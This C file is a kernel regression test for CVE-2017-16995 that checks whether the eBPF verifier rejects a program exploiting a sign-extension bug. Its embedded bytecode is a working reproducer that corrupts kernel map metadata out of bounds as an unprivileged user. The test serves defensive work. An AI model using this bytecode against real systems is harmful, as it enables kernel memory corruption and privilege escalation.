// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (c) 2019 Richard Palethorpe <rpalethorpe@suse.com>
 * Original byte code was provided by Jann Horn <jannh@google.com>
 */

/*\
 * [Description]
 *
 * CVE-2017-16995
 *
 * Test for the bug fixed by kernel commit
 * 95a762e2c8c9 ("bpf: fix incorrect sign extension in check_alu_op()")
 *
 * The test is very similar to the original reproducer:
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1454
 *
 * However it has been modified to try to corrupt the map struct instead of
 * writing to a noncanonical pointer. This appears to be more reliable at
 * producing stack traces and confirms we would be able to overwrite the ops
 * function pointers, as suggested by Jan Horn.
 *
 * If the eBPF code is loaded then this is considered a failure regardless of
 * whether it is able to cause any visible damage.
 */

#include <string.h>
#include <stdio.h>
#include <inttypes.h>

#include "config.h"
#include "tst_test.h"
#include "tst_capability.h"
#include "bpf_common.h"

#define LOG_SIZE (1024 * 1024)

#define CHECK_BPF_RET(x) ((x) >= 0 || ((x) == -1 && errno != EPERM))

static const char MSG[] = "Ahoj!";
static char *msg;

static char *log;
static uint32_t *key;
static uint64_t *val;
static union bpf_attr *attr;

static int load_prog(int fd)
{
	int ret;

	struct bpf_insn insn[] = {
		BPF_LD_MAP_FD(BPF_REG_1, fd),

		// fill r0 with pointer to map value
		BPF_MOV64_REG(BPF_REG_8, BPF_REG_10),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, -4), // allocate 4 bytes stack
		BPF_MOV32_IMM(BPF_REG_2, 0),
		BPF_STX_MEM(BPF_W, BPF_REG_8, BPF_REG_2, 0),
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_8),
		BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
		BPF_MOV64_REG(BPF_REG_0, 0), // prepare exit
		BPF_EXIT_INSN(), // exit

		// r1 = 0xffff'ffff, mistreated as 0xffff'ffff'ffff'ffff
		BPF_MOV32_IMM(BPF_REG_1, -1),
		// r1 = 0x1'0000'0000, mistreated as 0
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),
		// r1 = 64, mistreated as 0
		BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, 26),

		// Write actual value of r1 to map for debugging this test
		BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0),

		// Corrupt the map meta-data which comes before the map data
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_2, BPF_REG_1),

		BPF_MOV64_IMM(BPF_REG_3, 0xdeadbeef),
		BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_2, BPF_REG_1),
		BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_2, BPF_REG_1),
		BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_2, BPF_REG_1),
		BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),

		// terminate to make the verifier happy
		BPF_MOV32_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN()
	};

	bpf_init_prog_attr(attr, insn, sizeof(insn), log, LOG_SIZE);
	ret = TST_RETRY_FUNC(bpf(BPF_PROG_LOAD, attr, sizeof(*attr)),
		CHECK_BPF_RET);

	if (ret < -1)
		tst_brk(TBROK, "Invalid bpf() return value %d", ret);

	if (ret >= 0) {
		tst_res(TINFO, "Verification log:");
		fputs(log, stderr);
		return ret;
	}

	if (log[0] == 0)
		tst_brk(TBROK | TERRNO, "Failed to load program");

	tst_res(TPASS | TERRNO, "Failed verification");
	return ret;
}

static void setup(void)
{
	rlimit_bump_memlock();
	memcpy(msg, MSG, sizeof(MSG));
}

static void run(void)
{
	int map_fd, prog_fd;

	map_fd = bpf_map_array_create(32);

	memset(attr, 0, sizeof(*attr));
	attr->map_fd = map_fd;
	attr->key = ptr_to_u64(key);
	attr->value = ptr_to_u64(val);
	attr->flags = BPF_ANY;

	TEST(bpf(BPF_MAP_UPDATE_ELEM, attr, sizeof(*attr)));
	if (TST_RET == -1)
		tst_brk(TBROK | TTERRNO, "Failed to lookup map element");

	prog_fd = load_prog(map_fd);
	if (prog_fd == -1)
		goto exit;

	tst_res(TFAIL, "Loaded bad eBPF, now we will run it and maybe crash");

	bpf_run_prog(prog_fd, msg, sizeof(MSG));
	SAFE_CLOSE(prog_fd);

	*key = 0;
	bpf_map_array_get(map_fd, key, val);
	tst_res(TINFO, "Pointer offset was 0x%"PRIx64, *val);
exit:
	SAFE_CLOSE(map_fd);
}

static struct tst_test test = {
	.setup = setup,
	.test_all = run,
	.min_kver = "3.18",
	.caps = (struct tst_cap []) {
		TST_CAP(TST_CAP_DROP, CAP_SYS_ADMIN),
		{}
	},
	.bufs = (struct tst_buffers []) {
		{&key, .size = sizeof(*key)},
		{&val, .size = sizeof(*val)},
		{&log, .size = LOG_SIZE},
		{&attr, .size = sizeof(*attr)},
		{&msg, .size = sizeof(MSG)},
		{},
	},
	.tags = (const struct tst_tag[]) {
		{"linux-git", "95a762e2c8c9"},
		{"CVE", "2017-16995"},
		{}
	}
};
